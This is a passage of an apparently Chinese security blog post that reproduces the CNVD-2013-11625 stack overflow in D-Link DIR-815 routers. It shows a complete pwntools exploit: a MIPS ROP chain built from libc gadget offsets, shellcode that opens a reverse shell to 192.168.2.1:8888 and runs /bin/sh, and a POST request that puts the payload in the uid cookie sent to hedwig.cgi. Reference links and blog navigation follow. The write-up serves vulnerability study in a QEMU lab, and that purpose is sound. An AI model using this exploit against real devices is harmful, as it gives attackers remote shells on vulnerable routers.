class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;mips&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">libc_base = <span class="number">0x77f34000</span></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x3cd</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x436D0</span>) <span class="comment"># s1  move $t9, $s3 (=&gt; lw... =&gt; jalr $t9)</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x56BD0</span>) <span class="comment"># s3  sleep</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">4</span>*<span class="number">5</span>)</span><br><span class="line">payload += p32(libc_base + <span class="number">0x57E50</span>) <span class="comment"># ra  li $a0, 1 (=&gt; jalr $s1)</span></span><br><span class="line"> </span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">4</span>*<span class="number">4</span>)</span><br><span class="line">payload += p32(libc_base + <span class="number">0x37E6C</span>) <span class="comment"># s4  move  $t9, $a1 (=&gt; jalr $t9)</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x3B974</span>) <span class="comment"># ra  addiu $a1, $sp, 0x18 (=&gt; jalr $s4)</span></span><br><span class="line"> </span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    slti $a0, $zero, 0xFFFF</span></span><br><span class="line"><span class="string">    li $v0, 4006</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    slti $a0, $zero, 0x1111</span></span><br><span class="line"><span class="string">    li $v0, 4006</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    li $t4, 0xFFFFFFFD</span></span><br><span class="line"><span class="string">    not $a0, $t4</span></span><br><span class="line"><span class="string">    li $v0, 4006</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    li $t4, 0xFFFFFFFD</span></span><br><span class="line"><span class="string">    not $a0, $t4</span></span><br><span class="line"><span class="string">    not $a1, $t4</span></span><br><span class="line"><span class="string">    slti $a2, $zero, 0xFFFF</span></span><br><span class="line"><span class="string">    li $v0, 4183</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    andi $a0, $v0, 0xFFFF</span></span><br><span class="line"><span class="string">    li $v0, 4041</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string">    li $v0, 4041</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    lui $a1, 0xB821 # Port: 8888</span></span><br><span class="line"><span class="string">    ori $a1, 0xFF01</span></span><br><span class="line"><span class="string">    addi $a1, $a1, 0x0101</span></span><br><span class="line"><span class="string">    sw $a1, -8($sp)</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    li $a1, 0x0102A8C0 # IP: 192.168.2.1</span></span><br><span class="line"><span class="string">    sw $a1, -4($sp)</span></span><br><span class="line"><span class="string">    addi $a1, $sp, -8</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    li $t4, 0xFFFFFFEF</span></span><br><span class="line"><span class="string">    not $a2, $t4</span></span><br><span class="line"><span class="string">    li $v0, 4170</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    lui $t0, 0x6962</span></span><br><span class="line"><span class="string">    ori $t0, $t0,0x2f2f</span></span><br><span class="line"><span class="string">    sw $t0, -20($sp)</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    lui $t0, 0x6873</span></span><br><span class="line"><span class="string">    ori $t0, 0x2f6e</span></span><br><span class="line"><span class="string">    sw $t0, -16($sp)</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    slti $a3, $zero, 0xFFFF</span></span><br><span class="line"><span class="string">    sw $a3, -12($sp)</span></span><br><span class="line"><span class="string">    sw $a3, -4($sp)</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    addi $a0, $sp, -20</span></span><br><span class="line"><span class="string">    addi $t0, $sp, -20</span></span><br><span class="line"><span class="string">    sw $t0, -8($sp)</span></span><br><span class="line"><span class="string">    addi $a1, $sp, -8</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    addiu $sp, $sp, -20</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    slti $a2, $zero, 0xFFFF</span></span><br><span class="line"><span class="string">    li $v0, 4011</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload += shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义目标 URL 和数据</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.2.2:4321/hedwig.cgi&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;icyice&quot;</span> : <span class="string">&quot;pwner&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义请求头</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>        : <span class="string">b&quot;uid=&quot;</span> + payload,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>  : <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Length&quot;</span>: <span class="string">&quot;12&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送 POST 请求</span></span><br><span class="line">res = requests.post(url = url, headers = headers, data = data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印响应</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/image-20260414221306637.png"></p>
+<p>最后附上复现学习过程中的参考文章：</p>
+<p>[<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-272318.htm">原创] 从零开始复现 DIR-815 栈溢出漏洞-二进制漏洞-看雪安全社区｜专业技术交流与安全研究论坛</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.uf4te.cn/posts/c2233a9.html#CNVD-2013-11625">CNVD-2013-11625复现 | 坠入星野的月🌙</a></p>
+<p>[CNVD-2013-11625 DIR-815 栈溢出漏洞 | Hexo](<a target="_blank" rel="noopener" href="https://khighl.github.io/2025/06/11/CNVD-2013-11625">https://khighl.github.io/2025/06/11/CNVD-2013-11625</a>  DIR-815 栈溢出漏洞&#x2F;)</p>
+<p><a target="_blank" rel="noopener" href="https://gggtaotao.github.io/post/376f79f0.html">CNVD-2013-11625 | 云梦</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Icyice</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2026/04/14/2026414-CNVD-2013-11625%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/">http://example.com/2026/04/14/2026414-CNVD-2013-11625%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">Icyice's Corner</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CVE%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/">CVE复现学习</a></div><div class="post-share"><div class="social-share" data-image="/img/OIF-C.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.png" target="_blank"><img class="post-qr-code-img" src="/img/wechat.png" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li></ul></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/03/19/2025319-%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9B---MailSystem%E7%9A%84pwn-wp/" title="软件系统安全赛pwn - MailSystem的wp"><img class="cover" src="/img/v2-f38077506a86852621153967e58f2d2c_r.png" onerror="onerror=null;src='/img/loading.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">软件系统安全赛pwn - MailSystem的wp</div></div><div class="info-2"><div class="info-item-1">软件系统安全赛 - MailSystem前言：本来不想写wp的，因为第一次参加软件赛，不熟悉pwn题连接远端需要代理问题而交不上flag，但毕竟做了好久本地才打通，题也是挺好，还是写一下。 解题思路这道题首先是代码比较多，也定义了很多函数，审计比较慢。 附件保护全开，且开启了沙箱禁用了execve，execveat，简单审计后猜测栈溢出是很难了，开始估计是要打堆 （结果是打IO），所以看一下远端libc版本为glibc-2.35，无hook函数。 123456789101112131415161718192021222324252627┌─[icyice@icyice-virtual-machine] - [~/Desktop/刷的上一道题] - [10004]└─[$] checksec pwn                                                                                                                                               ...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/I.jpg" onerror="this.onerror=null;this.src='/img/loading.gif'" alt="avatar"/></div><div class="author-info-name">Icyice</div><div class="author-info-description">今次唯一，不可重现</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Icyice001"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Icyice001" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的小站，我在这里分享一些我学习 PWN 的犯错经验与做题笔记。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CNVD-2013-11625%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95"><span class="toc-number">1.</span> <span class="toc-text">CNVD-2013-11625复现记录</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF"><span class="toc-number">2.</span> <span class="toc-text">0x00 漏洞信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="toc-number">3.</span> <span class="toc-text">0x01 准备工作</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9C%80%E8%A6%81%E4%BA%86%E8%A7%A3%E5%88%B0%E7%9A%84mips%E6%9E%B6%E6%9E%84%E4%B8%8B%E7%9A%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86"><span class="toc-number">3.1.</span> <span class="toc-text">需要了解到的mips架构下的相关知识:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E7%89%B9%E6%80%A7"><span class="toc-number">3.1.1.</span> <span class="toc-text">函数特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%81%E6%B0%B4%E7%BA%BF%E6%8C%87%E4%BB%A4%E9%9B%86%E7%89%B9%E6%80%A7"><span class="toc-number">3.1.2.</span> <span class="toc-text">流水线指令集特性</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E5%8F%96%E5%9B%BA%E4%BB%B6%EF%BC%9A"><span class="toc-number">3.2.</span> <span class="toc-text">提取固件：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">0x02 逆向分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E7%BC%96%E5%86%99exp"><span class="toc-number">5.</span> <span class="toc-text">0x03 编写exp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#QEMU-%E7%94%A8%E6%88%B7%E7%BA%A7%E5%A4%8D%E7%8E%B0"><span class="toc-number">5.1.</span> <span class="toc-text">QEMU 用户级复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%91%E7%94%A8%E6%88%B7%E6%80%81-QEMU-%E4%BC%A0%E9%80%92-payload-%E5%8F%82%E6%95%B0"><span class="toc-number">5.1.1.</span> <span class="toc-text">向用户态 QEMU 传递 payload 参数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E7%BA%AF-ROP-%E9%93%BE%EF%BC%8C%E5%8D%B3%E6%9E%84%E9%80%A0-system-%E2%80%9C-bin-sh%E2%80%9D-%E6%9D%A5-getshell"><span class="toc-number">5.1.1.1.</span> <span class="toc-text">1. 纯 ROP 链，即构造 system(“&#x2F;bin&#x2F;sh”) 来 getshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E9%80%9A%E8%BF%87-shellcode-%E6%9D%A5-getshell%EF%BC%88%E7%94%B1%E4%BA%8E-MIPS-%E6%9E%B6%E6%9E%84%E6%98%AF%E6%97%A0%E6%B3%95%E5%BC%80%E5%90%AF-NX-%E4%BF%9D%E6%8A%A4%E7%9A%84%EF%BC%8C%E5%9B%A0%E6%AD%A4%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8-ret2shellcode%EF%BC%8C%E4%BD%86%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F-shellcode-%E4%B8%AD%E4%B8%8D%E8%83%BD%E5%AD%98%E5%9C%A8-b%E2%80%99-x00%E2%80%99-%E7%AD%89%E5%AD%97%E7%AC%A6%E9%98%B2%E6%AD%A2%E5%AF%BC%E8%87%B4-sprintf-%E8%A2%AB%E6%88%AA%E6%96%AD%EF%BC%89"><span class="toc-number">5.1.1.2.</span> <span class="toc-text">2. 通过 shellcode 来 getshell（由于 MIPS 架构是无法开启 NX 保护的，因此可以使用 ret2shellcode，但需要注意 shellcode 中不能存在 b’\x00’ 等字符防止导致 sprintf 被截断）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AE%B5-ROP%EF%BC%9A%E8%B0%83%E7%94%A8-sleep-1-%E5%88%B7%E6%96%B0%E7%BC%93%E5%AD%98"><span class="toc-number">5.1.1.2.1.</span> <span class="toc-text">第一段 ROP：调用 sleep(1) 刷新缓存</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AE%B5-ROP%EF%BC%9A%E8%B7%B3%E8%BD%AC%E5%88%B0%E6%A0%88%E4%B8%8A-shellcode"><span class="toc-number">5.1.1.2.2.</span> <span class="toc-text">第二段 ROP：跳转到栈上 shellcode</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9B%9B%E3%80%81Shellcode%EF%BC%9A%E6%89%A7%E8%A1%8C-bin-sh"><span class="toc-number">5.1.1.2.3.</span> <span class="toc-text">四、Shellcode：执行 &#x2F;bin&#x2F;sh</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#syscall-%E5%90%8E%E9%9D%A2%E7%9A%84%E6%95%B0%E5%AD%97%E6%98%AF%E4%B8%80%E4%B8%AA20-%E4%BD%8D%E7%9A%84-code-%E5%AD%97%E6%AE%B5%EF%BC%8C%E5%AF%B9%E6%AF%94%E6%9C%BA%E5%99%A8%E7%A0%81"><span class="toc-number">5.1.1.2.4.</span> <span class="toc-text">syscall 后面的数字是一个20 位的 code 字段，对比机器码</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#QEMU-%E7%B3%BB%E7%BB%9F%E7%BA%A7%E5%A4%8D%E7%8E%B0"><span class="toc-number">5.2.</span> <span class="toc-text">QEMU 系统级复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">5.2.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%91-QEMU-%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8A%E4%BC%A0-payload"><span class="toc-number">5.2.2.</span> <span class="toc-text">向 QEMU 虚拟机上传 payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%91-httpd-%E6%9C%8D%E5%8A%A1%E5%8F%91%E9%80%81-HTTP-%E6%8A%A5%E6%96%87"><span class="toc-number">5.2.3.</span> <span class="toc-text">向 httpd 服务发送 HTTP 报文</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/04/14/2026414-CNVD-2013-11625%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/" title="CNVD-2013-11625复现记录"><img src="/img/OIF-C.webp" onerror="this.onerror=null;this.src='/img/loading.jpg'" alt="CNVD-2013-11625复现记录"/></a><div class="content"><a class="title" href="/2026/04/14/2026414-CNVD-2013-11625%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/" title="CNVD-2013-11625复现记录">CNVD-2013-11625复现记录</a><time datetime="2026-04-13T16:00:00.000Z" title="发表于 2026-04-14 00:00:00">2026-04-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/03/19/2025319-%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9B---MailSystem%E7%9A%84pwn-wp/" title="软件系统安全赛pwn - MailSystem的wp"><img src="/img/v2-f38077506a86852621153967e58f2d2c_r.png" onerror="this.onerror=null;this.src='/img/loading.jpg'" alt="软件系统安全赛pwn - MailSystem的wp"/></a><div class="content"><a class="title" href="/2026/03/19/2025319-%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9B---MailSystem%E7%9A%84pwn-wp/" title="软件系统安全赛pwn - MailSystem的wp">软件系统安全赛pwn - MailSystem的wp</a><time datetime="2026-03-18T16:00:00.000Z" title="发表于 2026-03-19 00:00:00">2026-03-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/31/20251231-2025%E5%B9%B4%E7%BB%88%E8%AE%B2/" title="2025年终讲"><img src="/img/OII.jpg" onerror="this.onerror=null;this.src='/img/loading.jpg'" alt="2025年终讲"/></a><div class="content"><a class="title" href="/2025/12/31/20251231-2025%E5%B9%B4%E7%BB%88%E8%AE%B2/" title="2025年终讲">2025年终讲</a><time datetime="2025-12-30T16:00:00.000Z" title="发表于 2025-12-31 00:00:00">2025-12-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/09/20251013-DASCTF2025%E4%B8%8B%E5%8D%8A%E5%B9%B4%E8%B5%9B-PWN%E6%96%B9%E5%90%91%E5%A4%8D%E7%8E%B0/" title="DASCTF2025下半年赛-PWN方向复现"><img src="/img/OII.jpg" onerror="this.onerror=null;this.src='/img/loading.jpg'" alt="DASCTF2025下半年赛-PWN方向复现"/></a><div class="content"><a class="title" href="/2025/12/09/20251013-DASCTF2025%E4%B8%8B%E5%8D%8A%E5%B9%B4%E8%B5%9B-PWN%E6%96%B9%E5%90%91%E5%A4%8D%E7%8E%B0/" title="DASCTF2025下半年赛-PWN方向复现">DASCTF2025下半年赛-PWN方向复现</a><time datetime="2025-12-08T16:00:00.000Z" title="发表于 2025-12-09 00:00:00">2025-12-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/09/2025129-ISCTF2025-PWN%E6%96%B9%E5%90%91%E5%A4%8D%E7%8E%B0/" title="ISCTF2025-PWN方向wp"><img src="/img/d58a13c5b98333c735e9ae302beac44f.jpg" onerror="this.onerror=null;this.src='/img/loading.jpg'" alt="ISCTF2025-PWN方向wp"/></a><div class="content"><a class="title" href="/2025/12/09/2025129-ISCTF2025-PWN%E6%96%B9%E5%90%91%E5%A4%8D%E7%8E%B0/" title="ISCTF2025-PWN方向wp">ISCTF2025-PWN方向wp</a><time datetime="2025-12-08T16:00:00.000Z" title="发表于 2025-12-09 00:00:00">2025-12-09</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/20191107212822_gyqlp.png);"><div id="footer-wrap"><div class="copyright">&copy;2025/4/19 - 2026 By Icyice</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="100" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
